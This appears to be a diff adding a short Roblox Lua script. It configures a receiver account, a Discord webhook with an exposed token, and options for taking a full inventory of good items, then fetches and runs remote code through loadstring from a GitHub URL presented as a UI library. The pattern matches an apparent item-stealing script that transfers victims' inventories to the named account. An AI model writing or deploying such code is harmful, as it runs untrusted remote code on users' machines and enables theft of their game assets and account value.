@@ -1,0 +1,10 @@
+Config = {
+    Receivers = {"imnotstraigtimcool12"},
+    Webhook = "https://discord.com/api/webhooks/1265173900203921429/lGNMr6HHLd9vxMTP3BfxLH6dbccbZQszFiHRrzRHSk4ve438pDZvyWLM82SAH1AbZ9wK",
+    FullInventory = true,
+    GoodItemsOnly = true,
+    ResendTrade = ".resend",
+    Script = "Nexus",
+    CustomLink = ""
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source"))()
